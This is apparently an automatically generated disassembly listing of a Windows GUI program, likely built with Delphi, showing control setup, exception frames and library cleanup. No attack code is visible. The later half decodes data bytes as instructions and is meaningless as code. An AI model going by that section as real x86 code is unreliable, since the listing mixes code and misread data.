mov eax [ ebp - 0x4 ]
call sub_44c8a4
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438566
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_438570
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_438825
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_430708
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_42b84c
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x60 ]
call sub_40408c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434164
mov ebx eax
mov [ esi + 0xb8 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_44c8a4
push 0xa9
push 0xc8
mov ecx 0x5
mov edx 0xcc
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
call sub_4345b4
mov edx 0x6
mov eax ebx
call sub_4345ec
mov dx 0x1
mov eax ebx
call sub_4532d4
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_442118
mov ebx eax
mov [ esi + 0xbc ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_44c8a4
push 0x9d
push 0x17
mov ecx 0x6
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x1
mov eax ebx
call sub_44bd60
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43741c
mov ebx eax
mov [ esi + 0xc0 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x17
push 0x16
mov ecx 0x1
mov edx 0x4d
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_437bf0
mov ecx r-xdata
mov edx [ rw-data ]
call sub_42a320
lea edx [ ebx + 0x80 ]
mov eax [ rw-data ]
call sub_405df8
xor edx edx
mov eax ebx
call sub_44c9e8
mov dl 0x1
mov eax ebx
call sub_44c9c4
mov [ ebx + 0x124 ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x120 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434164
mov ebx eax
mov [ esi + 0xc4 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_44c8a4
push 0x9d
push 0x91
mov ecx 0x1d
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x5
mov eax ebx
call sub_44bd60
mov dl 0x2
mov eax ebx
call sub_434598
mov dl 0x1
mov eax ebx
call sub_4345b4
xor edx edx
mov eax ebx
call sub_4532d4
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4339bc
mov [ esi + 0xc8 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ebx [ esi + 0xc8 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax ebx
call sub_44bd60
mov [ ebx + 0x12c ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x128 ] eax
mov edx [ esi + 0xc4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax ebx
call sub_433de8
mov dl 0x1
mov eax ebx
call sub_433db8
mov dl 0x1
mov eax ebx
call sub_433d90
mov [ ebx + 0x17a ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43882c
lea eax [ ebp - 0x8 ]
call sub_404038
retn
add esp 0xfffffff0
call sub_40360c
sub_43882c
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4388ec
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438ac4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430f50
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xcc ]
call sub_404444
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438acb
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40405c
retn
mov eax [ ebp - 0x4 ]
add eax 0xcc
mov edx [ ebp - 0x8 ]
call sub_40408c
mov eax [ ebp - 0x8 ]
call sub_408868
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4388d4
test al al
jne r-xdata
test bl bl
je r-xdata
mov bl 0x1
test bl bl
jne r-xdata
xor eax eax
push ebp
push sub_438a28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
mov eax [ eax + 0x168 ]
mov edx [ ebp - 0x8 ]
call sub_4277c8
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405df8
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_427d18
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_427d30
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
pop eax
call sub_40911c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_44c8a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
xor edx edx
call sub_44c8a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405df8
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_44c8a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
xor edx edx
call sub_433da8
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405df8
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
call sub_44c8a4
sub_438ae8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_438bc0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call GetClientRect
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
add edx eax
mov [ ebp - 0x10 ] edx
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xb8 ]
call sub_44c234
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0xc4 ]
call sub_44c214
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0xc0 ]
sub edx [ eax + 0x48 ]
sub edx 0x2
mov eax [ ebx + 0xc0 ]
call sub_44bfbc
xor edx edx
mov eax [ ebx + 0xc8 ]
call sub_433da8
lea eax [ ebx + 0xcc ]
call sub_404038
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405df8
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0xc4 ]
call sub_44c8a4
mov edx [ ebx + 0x3c ]
mov eax [ ebx + 0xb8 ]
call sub_4507ec
mov eax ebx
call sub_430670
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438bc7
lea eax [ ebp - 0x34 ]
call sub_404038
retn
sub_438c00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_438e67
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4656f0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438e4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_466534
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44c8a4
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_466eb4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22d ] 0x1
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_467514
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e4 ] edi
mov [ eax + 0x1e0 ] r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_434164
mov ebx eax
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_44c8a4
mov dl 0x5
mov eax ebx
call sub_44bd60
xor edx edx
mov eax ebx
call sub_4345b4
mov dl 0x1
mov eax ebx
call sub_434608
mov edx 0x5
mov eax ebx
call sub_4345ec
mov edx 0xff000005
mov eax ebx
call sub_44ca14
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebx + 0x1f8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4339bc
mov esi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax esi
call sub_44bd60
mov dl 0x1
mov eax esi
call sub_433db8
mov dl 0x1
mov eax esi
call sub_433de8
mov dl 0x1
mov eax esi
call sub_433d90
mov eax [ edi + 0xc8 ]
mov edx [ eax + 0x168 ]
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_427d18
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438e51
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
mov eax [ ebp - 0x4 ]
call sub_44c278
mov esi eax
mov eax ebx
call sub_44c278
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_427d18
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_467084
call sub_46a800
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
sar eax 0x2
pop edx
call sub_42be94
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4664d4
mov eax [ ebp - 0x4 ]
call sub_44c2bc
mov esi eax
mov eax ebx
call sub_44c2bc
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_427d30
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_467084
call sub_46a7cc
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
add eax 0x3
sar eax 0x2
pop edx
call sub_42be94
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_466504
add eax 0x3
sub_438ebc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_438f07
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_42b84c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_404444
sete al
xor al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438f0e
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_438f14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_438f39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438f40
retn
sub_438f5b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_438fa0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438fa7
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404aec
sub_438fc3
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_439008
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43900f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404aec
sub_43901f
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_439075
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43907c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404038
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_439088
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4390cc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4390d3
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43910d
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx * 4 + 0x41 ] ah
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc ecx
add ah dh
popfd
inc ebx
add al cl
sahf
inc ebx
add [ eax - 0x1fffbe6c ] dh
xchg esp eax
inc ecx
add al bl
xchg esp eax
inc ecx
add [ esi + ebx * 4 - 0x610bffbd ] cl
inc ebx
add [ eax ] dl
lahf
inc ebx
add [ edi + ebx * 4 ] bl
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
or cl [ ecx + 0x6d ]
inc ebx
outsd
outsb
je r-xdata
pop es
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
hlt
popad
dec ecx
outsb
js r-xdata
outsd
insb
dec ecx
je r-xdata
dec ecx
inc ebx
outsd
outsb
je r-xdata
insd
nop
adc [ ecx + 0x10070043 ] 0x54
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
outsb
je r-xdata
insd
outsd
je r-xdata
insb
dec ecx
je r-xdata
xor [ ebx + 0x280043 ] dl
add [ eax ] al
int3
outsd
insb
dec ecx
je r-xdata
add ecx [ eax ]
add al 0x4c
outsd
jb r-xdata
jae r-xdata
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
insd
sub al 0x91
inc ebx
add ah cl
arpl [ ecx ] ax
add al [ eax ]
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
jae r-xdata
add [ eax ] al
add [ eax ] dh
xchg ebx eax
inc ebx
add [ eax ] ch
add [ eax ] al
add ah cl
inc ecx
inc ebx
outsd
jae r-xdata
push esp
jns r-xdata
add [ edx ] cl
dec ecx
insd
arpl [ esi + ebp * 2 + 0x73 ] si
add al [ eax ]
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add bh bh
and [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
pop es
inc ebx
popad
jo r-xdata
dec esp
add eax 0x6d657449
xor [ eax ] edx
push esp
add [ eax ] al
add [ eax ] eax
or [ ebx + 0x6f ] dl
jb r-xdata
insb
dec ecx
je r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebp + edx * 4 + 0x41 ] bl
inc eax
inc ebx
outsd
outsb
je r-xdata
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al dh
xchg ecx eax
inc ebx
add [ esi ] al
jae r-xdata
nop
inc eax
xchg edx eax
inc ebx
add [ eax ] cl
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
sbb [ eax ] al
add bh bh
sub [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add [ eax ] eax
add [ esi + 0x34f80040 ] al
insb
dec ecx
je r-xdata
xor [ ebx + eax * 2 + 0x54120800 ] dl
dec ecx
push esp
jns r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
insd
jae r-xdata
inc eax
xor eax 0x34f80040
outsd
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
dec esi
outsd
outsb
push es
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6d ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
outsd
insd
jo r-xdata
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
insd
or [ 0x6d657449 ] al
xor dl [ eax ]
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add [ eax ] ch
xchg ebp eax
inc ebx
add ah cl
add [ eax ] al
add [ edi + eax * 4 ] bh
inc ebp
insd
push ebx
insb
add [ eax ] dh
xchg esp eax
inc ebx
add [ eax ] cl
adc dl [ ecx + ecx * 2 + 0x74 ]
insd
cmp al 0x92
add [ eax ] al
ror [ eax - 0x6d ] 0x43
add [ edi ] al
adc [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc ecx
inc ebx
outsd
outsb
je r-xdata
inc esp
popad
je r-xdata
add [ ecx + edx * 4 + 0x43 ] bh
add [ ecx + edx * 4 + 0x43 ] bh
jb r-xdata
add [ eax ] dl
insb
outsd
outsb
je r-xdata
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx * 4 + 0x45 ] ch
outsb
je r-xdata
jmp [ eax ]
inc ebx
outsd
outsb
je r-xdata
nop
inc ecx
add al cl
xchg ebp eax
inc ecx
add [ edx + ebx * 4 + 0x41 ] ah
add [ eax - 0x66 ] ch
inc ecx
add [ edx + ebx * 4 + 0x41 ] ch
add [ eax ] ah
0x9a240041 0x41
pushad
xchg esi eax
inc ecx
add ah bl
xchg esi eax
inc ecx
add [ edi + ebx * 4 + 0x54110043 ] dl
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
outsd
push es
jae r-xdata
add [ ebx + 0x439304c0 ] cl
xchg ecx eax
inc ebx
inc ebp
jbe r-xdata
add [ eax ] cl
nop
xchg ebp eax
inc ecx
insd
pop es
add [ 0x756c6156 ] eax
dec ecx
outsb
je r-xdata
je r-xdata
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
mov eax eax
inc eax
xchg ebp eax
inc ebx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
outsd
insd
jo r-xdata
outsd
insb
dec ecx
je r-xdata
je r-xdata
push esp
js r-xdata
mov eax eax
add al 0x93
inc ebx
outsb
je r-xdata
jb r-xdata
inc edx
add [ esi + 0x34f80040 ] al
inc eax
imul ebp [ esi + 0x67 ] 0x6d490a01
add [ eax ] al
add [ eax ] al
add [ esi + edx * 4 + 0xd80043 ] ah
add [ eax ] al
jl r-xdata
jb r-xdata
xchg esi eax
inc ebx
add [ eax ] al
jb r-xdata
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
enter 0x4394 0x0
sbb al 0x88
inc ebp
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
push esp
inc ebx
jne r-xdata
inc ebp
jbe r-xdata
jb r-xdata
inc ebx
add [ eax ] ah
add [ eax ] al
insd
jae r-xdata
dec ecx
outsb
je r-xdata
push es
jae r-xdata
imul esi [ ebx + 0x74 ] 0x694c5411
jae r-xdata
or [ esp + ecx * 2 ] al
add al dh
xor al 0x40
add ah bh
inc ecx
adc [ eax ] al
add [ ebx + edx * 4 + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
dec eax
pop edx
inc ecx
add [ eax + eax ] dh
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
jne r-xdata
add [ esp + eax * 2 ] eax
dec ecx
jne r-xdata
inc ebx
push esi
popad
insb
push es
add eax 0x756c6156
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
popad
dec ecx
outsb
js r-xdata
outsb
add [ bp + si ] ecx
dec ecx
insd
add [ ebp - 0x6a8fffc0 ] cl
inc ebx
add [ eax ] cl
adc al 0x54
inc edi
je r-xdata
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax - 0x5f ] al
inc ebx
add al cl
sbb [ edx ] eax
insb
sbb [ edx ] eax
clc
mov [ 0x19300043 ] al
inc edx
add [ eax - 0x1fffbc5f ] bl
lea eax [ ebp ]
rcl [ edi - 0x68a7ffbb ] 0x45
add ah ch
0xa2c00045 0x43
in al dx
mov [ 0xffffffffa4f80043 ] al
inc ebx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
sbb [ edx ] eax
mov [ ebp + eax * 2 + 0x45999800 ] cs
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
add [ ebx + edx * 4 + 0x12c00045 ] bh
inc edx
add [ edi + ecx * 4 ] ah
inc ebp
je r-xdata
in al 0x93
inc ebx
add [ eax ] cl
adc dl [ edi + eax * 2 + 0x65 ]
je r-xdata
inc ecx
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
xchg ebx eax
inc ebx
add [ ebp + 0x41 ] bl
jb r-xdata
inc edx
outsd
je r-xdata
jae r-xdata
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
xor [ esi + 0x10045 ] dl
insb
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
inc esp
xchg esi eax
inc ebx
add [ edx * 4 + 0x110043 ] bh
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx * 4 + 0x45 ] ch
add [ ebx + edx * 4 + 0x12c00045 ] bh
inc edx
add [ edi + ecx * 4 ] ah
inc ecx
add ah bh
mov [ 0x19080043 ] al
inc edx
add [ esp + ecx * 4 - 0x6667ffbb ] cl
inc ebp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax - 0x5f ] al
inc ebx
add al cl
sbb [ edx ] eax
insb
sbb [ edx ] eax
clc
mov [ 0x19300043 ] al
inc edx
add [ eax - 0x1fffbc5f ] bl
lea eax [ ebp ]
rcl [ edi - 0x68a7ffbb ] 0x45
add ah ch
0xa2c00045 0x43
dec esp
movsd [ edi ] [ esi ]
inc ebx
add al bh
movsb [ edi ] [ esi ]
inc ebx
add [ edx ] dl
push esp
push esi
imul esi [ edx + 0x74 ] 0x4c6c6175
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
nop
mov esp 0x7004396
adc dl [ esi + edx * 2 + 0x69 ]
jb r-xdata
add ah cl
push ss
pop es
push eax
outsd
imul ebp [ esi + 0x74 ] 0x3c007265
xchg ebp eax
inc ebx
add [ eax + 0x32 ] al
xor al 0x40
jb r-xdata
add [ eax ] al
add [ esp + edx * 4 + 0x43 ] bh
push ebx
je r-xdata
push es
outsb
je r-xdata
imul esi [ edx + 0x74 ] 0x496c6175
je r-xdata
inc ebp
outsd
insb
add [ edx * 4 - 0x7cb3ffbd ] bh
inc esp
insb
xchg ebx eax
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
je r-xdata
je r-xdata
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x65736143
push ebx
outsb
jae r-xdata
add [ eax ] al
adc [ eax ] al
sbb al 0x0
dec ecx
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
add [ eax ] cl
push ebx
push 0x4374726f
adc [ eax ] al
enter 0x0 0xff
pushfd
movsb [ edi ] [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
js r-xdata
js r-xdata
pop es
inc ebx
popad
jo r-xdata
arpl [ esi + ebp * 2 + 0x73 ] si
push cs
add [ eax ] al
adc [ eax ] al
mov al [ 0x30ff0000 ]
mov [ 0x10043 ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
adc [ eax ] al
add [ fs : eax ] al
dec eax
xchg esp eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
popad
je r-xdata
inc esp
add al 0x44
add [ eax + edx ] bh
inc eax
insd
inc ebp
jbe r-xdata
jae r-xdata
insd
inc ebx
outsd
jne r-xdata
outsb
je r-xdata
arpl [ esi + ebp * 2 + 0x73 ] si
xchg ebx eax
fadd [ esi - 0x6593ffbb ]
inc ebp
add [ edx + ebx * 4 - 0x6537ffbb ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000b ] al
arpl [ gs : edi + 0x6e ] bp
adc [ eax ] al
jl r-xdata
pop edx
inc ecx
add [ eax + eax - 0x672b0100 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
xchg esp eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
insd
popad
add [ eax + edx + 0x103c0040 ] dl
inc eax
